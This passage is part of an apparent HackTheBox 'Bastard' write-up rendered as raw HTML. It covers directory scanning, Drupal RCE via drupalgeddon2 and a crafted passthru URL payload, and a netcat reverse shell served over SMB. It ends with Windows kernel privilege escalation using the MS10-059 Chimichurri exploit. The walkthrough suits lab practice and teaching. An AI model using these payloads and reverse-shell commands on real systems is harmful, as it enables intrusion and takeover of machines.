</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>rhosts</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>sh_history</span><span class=p>/</span>         <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>ssh</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>mysql_history</span><span class=p>/</span>      <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>perf</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>subversion</span><span class=p>/</span>         <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>svn</span><span class=p>/</span><span class=n>entries</span><span class=p>/</span>        <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>swf</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>web</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/.</span><span class=n>svn</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=mf>0</span><span class=p>/</span>                   <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>200</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>7571</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>admin</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Admin</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>ADMIN</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>batch</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>entries</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Entries</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>includes</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>misc</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Misc</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>modules</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>node</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>200</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>7571</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>profiles</span><span class=p>/</span>            <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>rest</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>200</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>62</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>scripts</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Scripts</span><span class=p>/</span>             <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>search</span><span class=p>/</span>              <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Search</span><span class=p>/</span>              <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>sites</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Sites</span><span class=p>/</span>               <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>themes</span><span class=p>/</span>              <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>Themes</span><span class=p>/</span>              <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>1233</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>user</span><span class=p>/</span>                <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>200</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>7414</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>/</span><span class=n>xmlrpc</span><span class=p>.</span><span class=n>php</span><span class=p>/</span>          <span class=p>(</span><span class=n>Status</span><span class=err>:</span> <span class=mf>200</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=err>:</span> <span class=mf>42</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>===============================================================</span>
</span></span><span class=line><span class=cl><span class=mf>2023</span><span class=p>/</span><span class=mf>07</span><span class=p>/</span><span class=mf>20</span> <span class=mf>22</span><span class=err>:</span><span class=mf>23</span><span class=err>:</span><span class=mf>29</span> <span class=n>Finished</span>
</span></span><span class=line><span class=cl><span class=p>===============================================================</span>
</span></span></code></pre></div><p>But only we have a bunch of modules and nothing interesting.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>Reading the exploit docs, we realized that the exploit runs with the following command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>ruby</span> <span class=n>drupalggedon2</span><span class=o>.</span><span class=n>rb</span> <span class=vg>$IP</span> <span class=o>--</span><span class=n>verbose</span>
</span></span></code></pre></div><p>This exploits gives us a RCE thanks to a crafted url with the payload which we are going to execute.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://10.10.10.9/?q<span class=o>=</span>user/password<span class=p>&amp;</span>name<span class=o>[</span>%23post_render<span class=o>][]=</span>passthru<span class=p>&amp;</span>name<span class=o>[</span>%23type<span class=o>]=</span>markup<span class=p>&amp;</span>name<span class=o>[</span>%23markup<span class=o>]={</span>payload<span class=o>}</span>
</span></span></code></pre></div><p>I put a smbserver.py on the nc.exe directory in order to execute the next payload to have a reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>-e</span> <span class=n>cmd</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=py>20</span> <span class=mf>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>nc</span> <span class=n>-lv</span> <span class=mf>4444</span>
</span></span></code></pre></div><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/bastard-3.png></p><p>We are nt authority\iusr</p><p>Let’s try to acces to the user’s directory in order to cat the <strong>user’s flag</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/bastard-4.png></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>Let’s see what version of windows is running this machine. The output of the <code>systeminfo</code> command shows the OS name and version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>Host</span> <span class=n>Name</span><span class=err>:</span>                 <span class=n>BASTARD</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Name</span><span class=err>:</span>                   <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=n>Server</span> <span class=mf>2008</span> <span class=n>R2</span> <span class=n>Datacenter</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Version</span><span class=err>:</span>                <span class=mf>6.1</span><span class=p>.</span><span class=py>7600</span> <span class=n>N</span><span class=p>/</span><span class=n>A</span> <span class=n>Build</span> <span class=mf>7600</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Manufacturer</span><span class=err>:</span>           <span class=n>Microsoft</span> <span class=n>Corporation</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Configuration</span><span class=err>:</span>          <span class=n>Standalone</span> <span class=n>Server</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Build</span> <span class=n>Type</span><span class=err>:</span>             <span class=n>Multiprocessor</span> <span class=n>Free</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Owner</span><span class=err>:</span>          <span class=n>Windows</span> <span class=n>User</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Organization</span><span class=err>:</span>
</span></span><span class=line><span class=cl><span class=n>Product</span> <span class=n>ID</span><span class=err>:</span>                <span class=mf>55041</span><span class=p>-</span><span class=mf>402</span><span class=p>-</span><span class=mf>3582622</span><span class=p>-</span><span class=mf>84461</span>
</span></span><span class=line><span class=cl><span class=n>Original</span> <span class=n>Install</span> <span class=n>Date</span><span class=err>:</span>     <span class=mf>18</span><span class=p>/</span><span class=mf>3</span><span class=p>/</span><span class=mf>2017</span><span class=p>,</span> <span class=mf>7</span><span class=err>:</span><span class=mf>04</span><span class=err>:</span><span class=mf>46</span> <span class=err>��</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Boot</span> <span class=n>Time</span><span class=err>:</span>          <span class=mf>21</span><span class=p>/</span><span class=mf>7</span><span class=p>/</span><span class=mf>2023</span><span class=p>,</span> <span class=mf>4</span><span class=err>:</span><span class=mf>49</span><span class=err>:</span><span class=mf>40</span> <span class=err>��</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Manufacturer</span><span class=err>:</span>       <span class=n>VMware</span><span class=p>,</span> <span class=n>Inc</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Model</span><span class=err>:</span>              <span class=n>VMware</span> <span class=n>Virtual</span> <span class=n>Platform</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Type</span><span class=err>:</span>               <span class=nb>x64-based</span> <span class=n>PC</span>
</span></span><span class=line><span class=cl><span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>              <span class=mf>2</span> <span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel64</span> <span class=n>Family</span> <span class=mf>6</span> <span class=n>Model</span> <span class=mf>85</span> <span class=n>Stepping</span> <span class=mf>7</span> <span class=n>GenuineIntel</span> <span class=p>~</span><span class=mf>2294</span> <span class=n>Mhz</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>02</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel64</span> <span class=n>Family</span> <span class=mf>6</span> <span class=n>Model</span> <span class=mf>85</span> <span class=n>Stepping</span> <span class=mf>7</span> <span class=n>GenuineIntel</span> <span class=p>~</span><span class=mf>2294</span> <span class=n>Mhz</span>
</span></span><span class=line><span class=cl><span class=n>BIOS</span> <span class=n>Version</span><span class=err>:</span>              <span class=n>Phoenix</span> <span class=n>Technologies</span> <span class=n>LTD</span> <span class=mf>6.00</span><span class=p>,</span> <span class=mf>12</span><span class=p>/</span><span class=mf>12</span><span class=p>/</span><span class=mf>2018</span>
</span></span><span class=line><span class=cl><span class=n>Windows</span> <span class=n>Directory</span><span class=err>:</span>         <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Directory</span><span class=err>:</span>          <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>system32</span>
</span></span><span class=line><span class=cl><span class=n>Boot</span> <span class=n>Device</span><span class=err>:</span>               <span class=p>\</span><span class=n>Device</span><span class=p>\</span><span class=n>HarddiskVolume1</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Locale</span><span class=err>:</span>             <span class=n>el</span><span class=p>;</span><span class=n>Greek</span>
</span></span><span class=line><span class=cl><span class=n>Input</span> <span class=n>Locale</span><span class=err>:</span>              <span class=nb>en-us</span><span class=p>;</span><span class=n>English</span> <span class=p>(</span><span class=n>United</span> <span class=n>States</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Time</span> <span class=n>Zone</span><span class=err>:</span>                 <span class=p>(</span><span class=n>UTC</span><span class=p>+</span><span class=mf>02</span><span class=err>:</span><span class=mf>00</span><span class=p>)</span> <span class=n>Athens</span><span class=p>,</span> <span class=n>Bucharest</span><span class=p>,</span> <span class=n>Istanbul</span>
</span></span><span class=line><span class=cl><span class=n>Total</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span>     <span class=mf>2.047</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Available</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span> <span class=mf>1.583</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Max</span> <span class=n>Size</span><span class=err>:</span>  <span class=mf>4.095</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Available</span><span class=err>:</span> <span class=mf>3.606</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=k>In</span> <span class=n>Use</span><span class=err>:</span>    <span class=mf>489</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Page</span> <span class=n>File</span> <span class=n>Location</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>     <span class=n>C:</span><span class=p>\</span><span class=n>pagefile</span><span class=p>.</span><span class=py>sys</span>
</span></span><span class=line><span class=cl><span class=n>Domain</span><span class=err>:</span>                    <span class=n>HTB</span>
</span></span><span class=line><span class=cl><span class=n>Logon</span> <span class=n>Server</span><span class=err>:</span>              <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Hotfix</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>                 <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Network</span> <span class=n>Card</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>           <span class=mf>1</span> <span class=n>NIC</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel</span><span class=p>(</span><span class=n>R</span><span class=p>)</span> <span class=n>PRO</span><span class=p>/</span><span class=mf>1000</span> <span class=n>MT</span> <span class=n>Network</span> <span class=n>Connection</span>
</span></span><span class=line><span class=cl>                                 <span class=n>Connection</span> <span class=n>Name</span><span class=err>:</span> <span class=n>Local</span> <span class=n>Area</span> <span class=n>Connection</span>
</span></span><span class=line><span class=cl>                                 <span class=n>DHCP</span> <span class=n>Enabled</span><span class=err>:</span>    <span class=n>No</span>
</span></span><span class=line><span class=cl>                                 <span class=n>IP</span> <span class=n>address</span><span class=p>(</span><span class=n>es</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>9</span>
</span></span></code></pre></div><p>We are managing a Microsoft Windows Server 2008 R2 Datacenter 6.1.7600 with no Hostfix(s). Let’s see with the help of <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>windows-exploit-suggester</a> if exists any unpatched kernel vulnerability.</p><p>I saved the <code>systeminfo</code> output to a txt file to pass the file to my computer to run the windows-exploit-suggester without problems.</p><p>First we need to update the database with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python2</span> <span class=o>./</span><span class=n>windows</span><span class=o>-</span><span class=n>exploit</span><span class=o>-</span><span class=n>suggester</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>u</span>
</span></span></code></pre></div><p>Then we need to pass the following arguments to run it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python2</span> <span class=o>./</span><span class=n>windows</span><span class=o>-</span><span class=n>exploit</span><span class=o>-</span><span class=n>suggester</span><span class=o>.</span><span class=n>py</span> <span class=o>--</span><span class=n>database</span> <span class=n>database</span><span class=o>.</span><span class=n>xls</span> <span class=o>--</span><span class=n>systeminfo</span> <span class=n>systeminfo</span><span class=o>.</span><span class=n>txt</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS13-009: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>2792100<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege <span class=o>(</span>2778930<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS12-037: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>2699988<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer <span class=m>8</span> - Fixed Col Span ID Full ASLR, DEP <span class=p>&amp;</span> EMET 5., PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer <span class=m>8</span> - Fixed Col Span ID Full ASLR, DEP <span class=p>&amp;</span> EMET 5.0 Bypass <span class=o>(</span>MS12-037<span class=o>)</span>, PoC
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege <span class=o>(</span>2393802<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class=o>(</span>981957<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution <span class=o>(</span>2347290<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS10-059: Vulnerabilities in the Tracing Feature <span class=k>for</span> Services Could Allow Elevation of Privilege <span class=o>(</span>982799<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>E<span class=o>]</span> MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege <span class=o>(</span>981852<span class=o>)</span> - Important
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS10-002: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>978207<span class=o>)</span> - Critical
</span></span><span class=line><span class=cl><span class=o>[</span>M<span class=o>]</span> MS09-072: Cumulative Security Update <span class=k>for</span> Internet Explorer <span class=o>(</span>976325<span class=o>)</span> - Critical
</span></span></code></pre></div><p>The scan results show three non-metasploit vulnerabilities.</p><p>I googled the MS11-011 exploit but seems a Windows XP exploit, so I tried the MS10-059.</p><p><img alt=Untitled loading=lazy src=/HTB/bastard-5.png></p><h3 id=ms10-059>MS10-059<a hidden class=anchor aria-hidden=true href=#ms10-059>#</a></h3><p>I found a github repo <a href=https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe>Chimichurri.exe</a> with a compiled binary of the MS10-059 exploit.</p><p>Only rests, send the exploit (I send it with <a href=http://smbserver.py>smbserver.py</a> in the file directory).</p><p>In order to send the file without problems, I created a directory on <code>C:\Windows\Temp</code> called PrivEsc.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>cd </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span>
</span></span><span class=line><span class=cl><span class=n>mkdir</span> <span class=n>PrivEsc</span>
</span></span><span class=line><span class=cl><span class=nb>cd </span><span class=n>PrivEsc</span>
</span></span><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>Chimichurri</span><span class=p>.</span><span class=py>exe</span> <span class=p>.</span>
</span></span></code></pre></div><p>Once send it, let’s run it and set a nc listener and see the magic happens.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>Chimichurri</span><span class=p>.</span><span class=py>exe</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=py>20</span> <span class=mf>4445</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4445</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/bastard-6.png></p><p>Other machine down</p><p><img alt=Untitled loading=lazy src=/HTB/bastard-7.png></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/windows/>Windows</a></li><li><a href=http://localhost:1313/tags/web/>Web</a></li><li><a href=http://localhost:1313/tags/privesc/>Privesc</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>